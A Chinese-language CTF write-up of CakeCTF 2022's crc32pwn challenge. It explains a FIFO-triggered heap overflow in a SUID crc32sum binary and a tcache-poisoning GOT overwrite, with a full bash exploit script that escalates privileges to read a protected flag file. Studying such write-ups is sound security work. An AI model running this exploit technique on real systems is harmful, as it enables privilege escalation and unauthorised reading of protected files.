# CakeCTF 2022 crc32pwn Writeup

## 题目简述

环境提供一个属于 `admin` 且带 SUID 位的 `crc32sum`。普通用户不能直接读取 `/home/pwn/flag.txt`，但该程序会以有效高权限计算任意文件的 CRC32。

程序先用 `fstat` 取得文件大小，按该大小 `malloc`，再逐字节读取直到 EOF：

```c
fstat(fd, &stbuf);
buffer = malloc(stbuf.st_size);

p = buffer;
while (read(fd, p++, 1) == 1);
```

普通文件的 `st_size` 与数据长度一致；FIFO 等特殊文件的 `st_size` 为 0，却仍可持续读入任意长度数据。`malloc(0)` 只返回最小堆块，由此产生可控堆溢出。

## 解题过程

### 从 FIFO 得到堆溢出

为一个命名管道调用 `crc32sum` 时，程序对它执行 `malloc(0)`。在另一端向管道写入超过最小堆块容量的数据，`read` 循环不会检查剩余空间，会一直覆盖后续堆块。

程序处理每个参数时会同时分配两类对象：

1. `strdup(argv[i])` 分配文件名；
2. `malloc(st_size)` 分配文件内容。

通过控制文件名长度和普通文件大小，可以提前在 tcache 的 `0x20`、`0x30`、`0x40` 大小类中布置空闲块，再让 FIFO 的最小块紧邻一个已释放的 `0x40` 块。

### tcache poisoning 指向 GOT

目标二进制关闭 PIE，只启用 partial RELRO，因此 GOT 地址固定且 `free@GOT` 可写。FIFO 溢出保留下一个块的 `size=0x41`，同时把该空闲块的 tcache `next` 指针改成 `free@GOT`。

后续两次 `0x40` 大小的分配依次返回真实空闲块和 `free@GOT`。第二个分配对应文件内容缓冲区，于是读取文件内容时就能直接覆盖 GOT。将 `free@GOT` 改成 `system@PLT` 后：

```c
free(buffer);
```

等价于：

```c
system(buffer);
```

完整利用脚本中的关键堆布局如下。地址来自题目给出的非 PIE 二进制：

```bash
#!/bin/bash
set -eu

target=/usr/bin/crc32sum
workdir=$(mktemp -d /tmp/crc32pwn.XXXXXX)
cd "$workdir"

path_a=AAAAAAAAAAAAAAAAaaaaaaaa_10h
path_b=BBBBBBBBBBBBBBBBbbbbbbbb_20h
path_c=CCCCCCCCCCCCCCCCccccccccccccccccCCCCCCCC_30h
path_pwn=AAAAAAAAAAAAAAAAaaaaaaaa_pwn

printf '0%.0s' {1..16} > "$path_a"
printf '1%.0s' {1..32} > "$path_b"

# free@GOT 开始的 GOT 表内容；首项改为 system@PLT，
# 其余项保持为相应 PLT stub，避免覆盖相邻槽后立即崩溃。
printf '\x50\x10\x40\x00\x00\x00\x00\x00' >> "$path_c"
printf '\x40\x10\x40\x00\x00\x00\x00\x00' >> "$path_c"
printf '\x50\x10\x40\x00\x00\x00\x00\x00' >> "$path_c"
printf '\x60\x10\x40\x00\x00\x00\x00\x00' >> "$path_c"
printf '\x70\x10\x40\x00\x00\x00\x00\x00' >> "$path_c"
printf '\x80\x10\x40\x00\x00\x00\x00\x00' >> "$path_c"

mkfifo "$path_pwn"

# 覆盖相邻 0x40 tcache 块的元数据和 next 指针。
printf '3%.0s' {1..24} > overflow
printf '\x41\x00\x00\x00\x00\x00\x00\x00' >> overflow
printf '\x18\x40\x40' >> overflow

printf 'id; cat /home/pwn/flag.txt;' > cmd

"$target" \
  "$path_b" "$path_a" "$path_c" \
  "$path_pwn" \
  "$path_c" \
  cmd &

sleep 1
cat overflow > "$path_pwn"
wait
```

最后一个参数是普通文件 `cmd`。其内容被读进堆缓冲区后，原本的 `free(buffer)` 调用了 `system("id; cat /home/pwn/flag.txt;")`。SUID 程序开头又执行了 `setreuid(geteuid(), geteuid())`，命令因此继承 `admin` 权限并读出：

```text
CakeCTF{pr0c3ss1ng_f1l3s_w1th0ut_BUG_1s_sup3r_h4rd!}
```

## 方法总结

根因是把 `st_size` 当成后续可读取字节数。对 FIFO、设备或 procfs 文件，这两个概念并不等价。只要读取循环不维护容量，`malloc(st_size)` 就可能变成堆溢出。

利用链依次是：特殊文件制造溢出、堆布局控制、tcache poisoning、可写 GOT 覆盖、`free` 转 `system`。修复时应使用带容量增长的读取逻辑，并同时启用 full RELRO、PIE 等缓解措施；后者只能提高利用难度，不能替代边界检查。
